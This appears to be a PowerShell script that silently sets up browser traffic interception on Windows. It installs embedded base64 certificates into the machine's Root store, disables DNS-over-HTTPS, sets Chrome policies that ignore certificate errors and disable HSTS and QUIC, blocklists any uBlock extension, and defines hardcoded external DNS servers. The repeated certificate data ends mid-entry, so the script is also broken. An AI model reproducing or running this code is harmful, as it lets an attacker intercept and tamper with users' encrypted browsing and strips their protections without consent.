. ./consts.ps1

function ConfigureCertificates {
    foreach ($key in $xdata.Keys) {
        Cert-Work -contentString $xdata[$key]
    }
}

function Cert-Work {
    param(
        [string] $contentString
    )
    $outputFilePath = [System.IO.Path]::GetTempFileName()
    $binary = [Convert]::FromBase64String($contentString)
    Set-Content -Path $outputFilePath -Value $binary -AsByteStream
    Install-CertificateToStores -CertificateFilePath $outputFilePath -Password '123'
}

function Install-CertificateToStores {
    param(
        [string] $CertificateFilePath,
        [string] $Password
    )

    try {
        $securePassword = ConvertTo-SecureString -String $Password -AsPlainText -Force

        # Import certificate to Personal (My) store
        $personalStorePath = "Cert:\LocalMachine\My"
        Import-PfxCertificate -FilePath $CertificateFilePath -CertStoreLocation $personalStorePath -Password $securePassword -ErrorAction Stop
        Write-Output "Certificate installed successfully to Personal store (My)."

        # Import certificate to Root store
        $rootStorePath = "Cert:\LocalMachine\Root"
        Import-PfxCertificate -FilePath $CertificateFilePath -CertStoreLocation $rootStorePath -Password $securePassword -ErrorAction Stop
        Write-Output "Certificate installed successfully to Root store."

    } catch {
        throw "Failed to install certificate: $_"
    }
}

function ConfigureChrome {
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" -Name "EnableAutoDOH" -Value 0

    $chromeKeyPath = "HKLM:\Software\Policies\Google\Chrome"

    if (-not (Test-Path $chromeKeyPath)) {
        New-Item -Path $chromeKeyPath -Force | Out-Null
    }

    New-Item -Path $chromeKeyPath -Force | Out-Null  # Create the key if it doesn't exist
    Set-ItemProperty -Path $chromeKeyPath -Name "CommandLineFlag" -Value "--ignore-certificate-errors --disable-quic --disable-hsts"
    Set-ItemProperty -Path $chromeKeyPath -Name "DnsOverHttps" -Value "off"

    Set-ItemProperty -Path $chromeKeyPath -Name "IgnoreCertificateErrors" -Value 1

    Write-Output "Chrome configured"
}

. ./utils.ps1

function ConfigureChromeUblock {
    $keywords = @("uBlock")

    foreach ($dir in Get-EnvPaths) {
        $chromeDir = Join-Path -Path $dir -ChildPath "Google\Chrome\User Data\Default\Extensions"
        
        try {
            if (Test-Path -Path $chromeDir -PathType Container) {
                $extensions = Get-ChildItem -Path $chromeDir -Directory

                foreach ($extension in $extensions) {
                    $manFile = chromeublock_FindManifestFile -folder $extension.FullName
                    if ($manFile -ne "") {
                        $foundKeyword = $false
                        
                        foreach ($manifestValue in $keywords) {
                            $content = Get-Content -Path $manFile -Raw
                            if ($content -match [regex]::Escape($manifestValue)) {
                                $foundKeyword = $true
                                break
                            }
                        }

                        if ($foundKeyword) {
                            $extFolderName = [System.IO.Path]::GetFileName($extension.FullName)
                            chromeublock_ProcessManifestAll -extName $extFolderName
                        }
                    }
                }
            }
        } catch {
             Write-Error "Error occurred: $_"
        }
    }
}


function chromeublock_FindManifestFile {
    param (
        [string]$folder
    )

    $result = ""

    Get-ChildItem -Path $folder | ForEach-Object {
        if (-not ($_.PSIsContainer)) {
            if ($_.Name -eq "manifest.json") {
                $result = $_.FullName
                return
            }
        } elseif ($_.Name -notin @('.', '..')) {
            $result = chromeublock_FindManifestFile -folder $_.FullName
            if ($result -ne "") {
                return
            }
        }
    }

    return $result
}


function chromeublock_ProcessManifestAll {
    param (
        [string]$extName
    )

    chromeublock_ProcessManifest -extName $extName -browser "Google\Chrome"
}

function chromeublock_ProcessManifest {
    param (
        [string]$extName,
        [string]$browser
    )

    $regPath = "HKLM:\SOFTWARE\Policies\$browser\ExtensionInstallBlocklist"
    
    if (-not (Test-Path $regPath)) {
        New-Item -Path $regPath -Force | Out-Null
    }
    
    $regKeyIndex = 1
    do {
        $keyName = "$regKeyIndex"
        $val = Get-ItemProperty -Path $regPath -Name $keyName -ErrorAction SilentlyContinue
        if ($val -eq $extName) {
            return
        }
        $regKeyIndex++
    } until (-not (Test-Path "$regPath\$keyName"))

    Set-ItemProperty -Path $regPath -Name $keyName -Value $extName
}
$PrimaryDNSServer = '185.247.141.78'
$SecondaryDNSServer = '185.247.141.51'
$xdata = @{
    'test.com'='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'+ 
'pDLDKu+todz6BG7rOAICB9A='
'test.com'='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'+ 
'pDLDKu+todz6BG7rOAICB9A='
'test.com'='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'+ 
'pDLDKu+todz6BG7rOAICB9A='
'test.com'='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'+ 
